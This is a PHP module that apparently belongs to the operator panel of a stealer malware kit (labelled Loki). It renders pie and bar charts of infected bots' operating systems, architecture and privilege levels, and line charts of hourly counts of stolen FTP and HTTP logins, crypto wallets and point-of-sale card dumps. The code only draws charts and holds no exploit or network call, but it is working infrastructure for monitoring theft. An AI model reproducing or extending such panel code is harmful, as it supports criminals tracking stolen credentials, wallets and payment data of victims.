<?php
	if(!defined('IN_LOKI')) die("File not found.");
	
	require_once(INCLUDE_."/class/pCharts/class/pData.class.php");
	require_once(INCLUDE_."/class/pCharts/class/pDraw.class.php");
	require_once(INCLUDE_."/class/pCharts/class/pImage.class.php");
	require_once(INCLUDE_."/class/pCharts/class/pPie.class.php");

	function MakeImage($Title, $Width, $Height, $Data, $Chart = 'line')
	{
		$MyPic = new pImage($Width, $Height, $Data, TRUE);

		$Settings = array("R"=>240, "G"=>240, "B"=>240, "Dash"=>9, "DashR"=>240, "DashG"=>240, "DashB"=>240);
		$MyPic->drawFilledRectangle(3, 3, $Width - 3, $Height - 3, $Settings);

		$Settings = array("StartR"=>240, "StartG"=>240, "StartB"=>240, "EndR"=>180, "EndG"=>180, "EndB"=>180, "Alpha"=>45);
		$MyPic->drawGradientArea(3, 3, $Width - 3, $Height - 3, DIRECTION_VERTICAL, $Settings);
		$MyPic->drawGradientArea(3, 3, $Width - 3, 20, DIRECTION_VERTICAL, array("StartR"=>0, "StartG"=>0, "StartB"=>0, "EndR"=>50, "EndG"=>50, "EndB"=>50, "Alpha"=>80));


		//$MyPic->drawRectangle(0, 0, $Width-1, $Height-1, array("R"=>0, "G"=>0, "B"=>0));
		$MyPic->drawRoundedRectangle(1, 1, $Width-2, $Height-2, 5,array("R"=>255, "G"=>255, "B"=>255));
		$MyPic->drawRoundedRectangle(2, 2, $Width-3, $Height-3, 5,array("R"=>0, "G"=>0, "B"=>0));
		$MyPic->drawRoundedRectangle(0,0,$Width-1,$Height-1,5,array("R"=>0,"G"=>0,"B"=>0,"Alpha"=>100));
		$MyPic->setFontProperties(array("FontName"=>INCLUDE_."/class/pCharts/fonts/calibri.ttf", "FontSize"=>9));
		$MyPic->drawText(8, 12, $Title, array("R"=>255, "G"=>255, "B"=>255, "Align"=>TEXT_ALIGN_MIDDLELEFT));

		if ($Chart == 'line')
		{
			$MyPic->setFontProperties(array("FontName"=>INCLUDE_."/class/pCharts/fonts/calibri.ttf", "FontSize"=>8));

			$MyPic->setGraphArea(60, 64, 450+200, 190);
			$MyPic->drawFilledRectangle(60, 50, 450+200, 190, array("R"=>255, "G"=>255, "B"=>255, "Surrounding"=>-255, "Alpha"=>60));

			$MyPic->drawScale(array("Mode"=>SCALE_MODE_START0, "DrawSubTicks"=>FALSE, "GridR"=>151, "GridG"=>197, "GridB"=>254, "GridAlpha"=>30));
			$MyPic->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>10));
		}

		$MyPic->setFontProperties(array("FontName"=>INCLUDE_."/class/pCharts/fonts/pf_arma_five.ttf", "FontSize"=>6));

		return $MyPic;
	}

	function FixOS($Source, $Key_ = "report_os")
	{
		//fiex
		$Result = array();
		$Size = sizeof($Source);
		$i = 0;

		while($Size > $i)
		{
			$OS_ = trim(str_replace(" R2", "", GetOSText($Source[$i][$Key_])));

			if(isset($Result['OS_LIST']))
			{
				if($Key = array_search($OS_, $Result['OS_LIST']))
				{
					$Result['OS_NUM'][$Key]  =  $Result['OS_NUM'][$Key] + $Source[$i]['Count_'];
				}
				else
				{
					$Result['OS_LIST'][] = $OS_;
					$Result['OS_NUM'][]  =  $Source[$i]['Count_'];
				}
			}
			else
			{
				$Result['OS_LIST'][] = $OS_;
				$Result['OS_NUM'][]  =  $Source[$i]['Count_'];
			}

			$i++;
		}

		return $Result;
	}

	if(strlen($Option_) && $Option_ == 'os')
	{
		$OS_Data = $LokiDBCon->GetOSData();

		$DataOS = new pData();

		$FixedOS = FixOS($OS_Data['OS_DATA'], "report_os");

		$DataOS->addPoints($FixedOS['OS_NUM'], "OSd");
		$DataOS->setSerieDescription("OSd", "Application A");
		$DataOS->addPoints($FixedOS['OS_LIST'], "Labels");
		$DataOS->setAbscissa("Labels");

		$MyImage = MakeImage($TextDB[$Lang][ 'chart_oss'], 680, 240, $DataOS, 'pie');
		$MyImage->setShadow(TRUE, array("X"=>2, "Y"=>2, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>50));

		$PieChart = new pPie($MyImage, $DataOS);

		$PieChart->draw2DPie(190, 125, array("ValueR"=>0, "ValueG"=>0, "ValueB"=>0, "ValueAlpha"=>80, "ValuePosition"=>PIE_VALUE_OUTSIDE, "LabelStacked"=>TRUE, "DrawLabels"=>TRUE, "DataGapAngle"=>8, "DataGapRadius"=>6, "Border"=>TRUE, "BorderR"=>255, "BorderG"=>255, "BorderB"=>255));

		$MyImage->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>20));
		$MyImage->drawText(190, 220, $TextDB[$Lang][ 'chart_osd'], array("DrawBox"=>TRUE, "BoxRounded"=>TRUE, "R"=>0, "G"=>0, "B"=>0, "Align"=>TEXT_ALIGN_TOPMIDDLE));


		$MyData = new pData();

		$MyData->addPoints(array($OS_Data[0]['Bit32'], $OS_Data[0]['User'], $OS_Data[0]['User'] + $OS_Data[0]['Admin']), "Probe 1");
		$MyData->addPoints(array($OS_Data[0]['Bit64'], $OS_Data[0]['Admin'], $OS_Data[0]['Elevated']), "Probe 2");

		$MyData->addPoints(array($TextDB[$Lang][ 'chart_architecture'], $TextDB[$Lang][ 'chart_account'], $TextDB[$Lang][ 'chart_privileges']), "Labels");
		$MyData->setAbscissa("Labels");

		$MyData->normalize(100, "%");

		$x = 395;
		$y = 55;
		$MyImage->setDataSet($MyData);
		$MyImage->setShadow(FALSE);
		$MyImage->setGraphArea($x, $y, $x + 270, 190);
		$MyImage->drawFilledRectangle($x, $y, $x + 270, 190, array("R"=>255, "G"=>255, "B"=>255, "Surrounding"=>-255, "Alpha"=>20));
		$AxisBoundaries = array(0=>array("Min"=>0, "Max"=>100));
		$ScaleSettings = array("YMargin"=>10, "Mode"=>SCALE_MODE_MANUAL, "ManualScale"=>$AxisBoundaries, "DrawSubTicks"=>TRUE, "DrawArrows"=>FALSE);
		$MyImage->drawScale($ScaleSettings);
		$MyImage->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>10));
		$settings = array("Gradient"=>TRUE, "DisplayPos"=>LABEL_POS_OUTSIDE, "DisplayValues"=>TRUE, "DisplayR"=>0, "DisplayG"=>0, "DisplayB"=>0, "DisplayShadow"=>TRUE, "Surrounding"=>30);
		$MyImage->drawBarChart($settings);
		$MyImage->setShadow(FALSE);

		$MyImage->drawText($x + 27, 182, 					$TextDB[$Lang][ 'chart_32bit'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 36, 182, 				$TextDB[$Lang][ 'chart_64bit'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90, 182, 				$TextDB[$Lang][ 'chart_user'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90 + 36 + 1, 182, 		$TextDB[$Lang][ 'chart_admin'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90 + 90, 182, 			$TextDB[$Lang][ 'chart_nonelevated'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90 + 90 + 36 + 1, 182, $TextDB[$Lang][ 'chart_elevated'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));

		$MyImage->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>20));

		$MyImage->drawText( $x + 44 + 90, 220, $TextDB[$Lang][ 'chart_aos'], array("DrawBox"=>TRUE, "BoxRounded"=>TRUE, "R"=>0, "G"=>0, "B"=>0, "Align"=>TEXT_ALIGN_TOPMIDDLE));

		$MyImage->Stroke();
	}
	else if(strlen($Option_) && $Option_ == 'os_bots')
	{
		$OS_Data = $LokiDBCon->GetOSDataBot();

		$DataOS = new pData();

		$FixedOS = FixOS($OS_Data['OS_DATA'], "bot_os");

		$DataOS->addPoints($FixedOS['OS_NUM'], "OSd");
		$DataOS->setSerieDescription("OSd", "Application A");
		$DataOS->addPoints($FixedOS['OS_LIST'], "Labels");
		$DataOS->setAbscissa("Labels");

		$MyImage = MakeImage($TextDB[$Lang][ 'chart_oss_bots'], 680, 240, $DataOS, 'pie');
		$MyImage->setShadow(TRUE, array("X"=>2, "Y"=>2, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>50));

		$PieChart = new pPie($MyImage, $DataOS);

		$PieChart->draw2DPie(190, 125, array("ValueR"=>0, "ValueG"=>0, "ValueB"=>0, "ValueAlpha"=>80, "ValuePosition"=>PIE_VALUE_OUTSIDE, "LabelStacked"=>TRUE, "DrawLabels"=>TRUE, "DataGapAngle"=>8, "DataGapRadius"=>6, "Border"=>TRUE, "BorderR"=>255, "BorderG"=>255, "BorderB"=>255));

		$MyImage->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>20));
		$MyImage->drawText(190, 220, $TextDB[$Lang][ 'chart_osd'], array("DrawBox"=>TRUE, "BoxRounded"=>TRUE, "R"=>0, "G"=>0, "B"=>0, "Align"=>TEXT_ALIGN_TOPMIDDLE));


		$MyData = new pData();

		$MyData->addPoints(array($OS_Data[0]['Bit32'], $OS_Data[0]['User'], $OS_Data[0]['User'] + $OS_Data[0]['Admin']), "Probe 1");
		$MyData->addPoints(array($OS_Data[0]['Bit64'], $OS_Data[0]['Admin'], $OS_Data[0]['Elevated']), "Probe 2");

		$MyData->addPoints(array($TextDB[$Lang][ 'chart_architecture'], $TextDB[$Lang][ 'chart_account'], $TextDB[$Lang][ 'chart_privileges']), "Labels");
		$MyData->setAbscissa("Labels");

		$MyData->normalize(100, "%");

		$x = 395;
		$y = 55;
		$MyImage->setDataSet($MyData);
		$MyImage->setShadow(FALSE);
		$MyImage->setGraphArea($x, $y, $x + 270, 190);
		$MyImage->drawFilledRectangle($x, $y, $x + 270, 190, array("R"=>255, "G"=>255, "B"=>255, "Surrounding"=>-255, "Alpha"=>20));
		$AxisBoundaries = array(0=>array("Min"=>0, "Max"=>100));
		$ScaleSettings = array("YMargin"=>10, "Mode"=>SCALE_MODE_MANUAL, "ManualScale"=>$AxisBoundaries, "DrawSubTicks"=>TRUE, "DrawArrows"=>FALSE);
		$MyImage->drawScale($ScaleSettings);
		$MyImage->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>10));
		$settings = array("Gradient"=>TRUE, "DisplayPos"=>LABEL_POS_OUTSIDE, "DisplayValues"=>TRUE, "DisplayR"=>0, "DisplayG"=>0, "DisplayB"=>0, "DisplayShadow"=>TRUE, "Surrounding"=>30);
		$MyImage->drawBarChart($settings);
		$MyImage->setShadow(FALSE);

		$MyImage->drawText($x + 27, 182, 					$TextDB[$Lang][ 'chart_32bit'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 36, 182, 				$TextDB[$Lang][ 'chart_64bit'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90, 182, 				$TextDB[$Lang][ 'chart_user'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90 + 36 + 1, 182, 		$TextDB[$Lang][ 'chart_admin'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90 + 90, 182, 			$TextDB[$Lang][ 'chart_nonelevated'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));
		$MyImage->drawText($x + 27 + 90 + 90 + 36 + 1, 182, $TextDB[$Lang][ 'chart_elevated'], array("Align"=>TEXT_ALIGN_TOPMIDDLE, "R"=>0, "G"=>0, "B"=>0));

		$MyImage->setShadow(TRUE, array("X"=>1, "Y"=>1, "R"=>0, "G"=>0, "B"=>0, "Alpha"=>20));

		$MyImage->drawText( $x + 44 + 90, 220, $TextDB[$Lang][ 'chart_aos'], array("DrawBox"=>TRUE, "BoxRounded"=>TRUE, "R"=>0, "G"=>0, "B"=>0, "Align"=>TEXT_ALIGN_TOPMIDDLE));

		$MyImage->Stroke();
	}
	else if($Option_ == '24h' && strlen($Option_))
	{
		$FTPData_ 	 = $LokiDBCon->CountDataToDateByHour("ftp", LastHour(24));
		$HTTPData_ 	 = $LokiDBCon->CountDataToDateByHour("http", LastHour(24));
		$DATAData_ 	 = $LokiDBCon->CountDataToDateByHour("data", LastHour(24));
		$ReportData_ = $LokiDBCon->GetReports_Last24h();
		
		if(MODULE_WALLET)
		{
			$WALLETData_  = $LokiDBCon->CountWalletByTime(LastHour(24));
		}
		
		if(MODULE_POS_GRABBER)
		{
			$DumpData 	 = $LokiDBCon->CountDataToDateByHour("dump", LastHour(24));
		}
		
		$FTPValue_ = array();
		$HTTPValue_ = array();
		$ReportValue_ = array();
		$DATAValue_ = array();
		$WALLETValue_ = array();
		$DUMPValue_ = array();
		$HourText = array();
		$MyData = new pData();
		$Time_ = time();

		for ($i = 23; $i >= 0; $i--)
		{
			array_push($HourText, date('H', $Time_-3600*$i));
			if (!isset($FTPData_[intval(date('H', $Time_-3600*$i))]))
				array_push($FTPValue_, NULL);
			else
				array_push($FTPValue_, $FTPData_[intval(date('H', $Time_-3600*$i))]);

			if (!isset($HTTPData_[intval(date('H', $Time_-3600*$i))]))
				array_push($HTTPValue_, NULL);
			else
				array_push($HTTPValue_, $HTTPData_[intval(date('H', $Time_-3600*$i))]);

			if (!isset($ReportData_[intval(date('H', $Time_-3600*$i))]))
				array_push($ReportValue_, NULL);
			else
				array_push($ReportValue_, $ReportData_[intval(date('H', $Time_-3600*$i))]);

			if (!isset($DATAData_[intval(date('H', $Time_-3600*$i))]))
				array_push($DATAValue_, NULL);
			else
				array_push($DATAValue_, $DATAData_[intval(date('H', $Time_-3600*$i))]);
			
			if(MODULE_WALLET)
			{
				if (!isset($WALLETData_[intval(date('H', $Time_-3600*$i))]))
					array_push($WALLETValue_, NULL);
				else
					array_push($WALLETValue_, $WALLETData_[intval(date('H', $Time_-3600*$i))]);
			}
			
			if(MODULE_POS_GRABBER)
			{
				if (!isset($DumpData[intval(date('H', $Time_-3600*$i))]))
					array_push($DUMPValue_, NULL);
				else
					array_push($DUMPValue_, $DumpData[intval(date('H', $Time_-3600*$i))]);
			}
		}

		$TextOffset = 580;

		if ($ReportValue_ && sizeof($ReportValue_) > 0)
		{
			$MyData->addPoints($ReportValue_, $TextDB[$Lang][ 'chart_reports']);
			$MyData->setPalette($TextDB[$Lang][ 'chart_reports'], array("R"=>220, "G"=>82, "B"=>91, "Alpha"=>100));
		}

		if ($FTPValue_ && sizeof($FTPValue_) > 0)
		{
			$MyData->addPoints($FTPValue_, $TextDB[$Lang][ 'chart_ftp']);
			$MyData->setPalette($TextDB[$Lang][ 'chart_ftp'], array("R"=>0, "G"=>39, "B"=>94, "Alpha"=>100));
			
			$TextOffset -= 35;
		}

		if ($HTTPValue_ && sizeof($HTTPValue_) > 0)
		{
			$MyData->addPoints($HTTPValue_, $TextDB[$Lang][ 'chart_http']);
			$MyData->setPalette($TextDB[$Lang][ 'chart_http'], array("R"=>150, "G"=>10, "B"=>150, "Alpha"=>100));
			$TextOffset -= 35;
		}

		if ($DATAValue_ && sizeof($DATAValue_) > 0)
		{
			$MyData->addPoints($DATAValue_, $TextDB[$Lang][ 'chart_data']);
			$MyData->setPalette($TextDB[$Lang][ 'chart_data'], array("R"=>45, "G"=>191, "B"=>0, "Alpha"=>44));
			$TextOffset -= 35;
		}
		
		if(MODULE_WALLET)
		{
			if ($WALLETValue_ && sizeof($WALLETValue_) > 0)
			{
				
				$MyData->addPoints($WALLETValue_, $TextDB[$Lang][ 'chart_wallet']);
				$MyData->setPalette($TextDB[$Lang][ 'chart_wallet'], array("R"=>0, "G"=>0, "B"=>0, "Alpha"=>100));
				$TextOffset -= 35;
			}
		}

		if(MODULE_POS_GRABBER)
		{
			if ($DUMPValue_ && sizeof($DUMPValue_) > 0)
			{
				
				$MyData->addPoints($DUMPValue_, $TextDB[$Lang][ 'chart_dump']);
				$MyData->setPalette($TextDB[$Lang][ 'chart_dump'], array("R"=>110, "G"=>110, "B"=>200, "Alpha"=>70));
				$TextOffset -= 35;
			}
		}
		
		$MyData->setAxisName(0, $TextDB[$Lang][ 'chart_count']);
		$MyData->addPoints($HourText, "Labels");

		$MyData->setSerieDescription("Labels", $TextDB[$Lang][ 'chart_hours']);
		$MyData->setAbscissa("Labels");
		$MyData->setAbscissaName($TextDB[$Lang][ 'chart_hours']);
		$MyData->setAxisDisplay(0, AXIS_FORMAT_METRIC);

		$MyImage = MakeImage($TextDB[$Lang][ 'chart_new_pass'], 680, 230, $MyData);
		$MyImage->drawLineChart(array("DisplayValues"=>TRUE, "DisplayColor"=>DISPLAY_AUTO));
		$MyImage->drawLegend($TextOffset, 215, array("Style"=>LEGEND_NOBORDER, "Mode"=>LEGEND_HORIZONTAL));

		$MyImage->Stroke();
	}
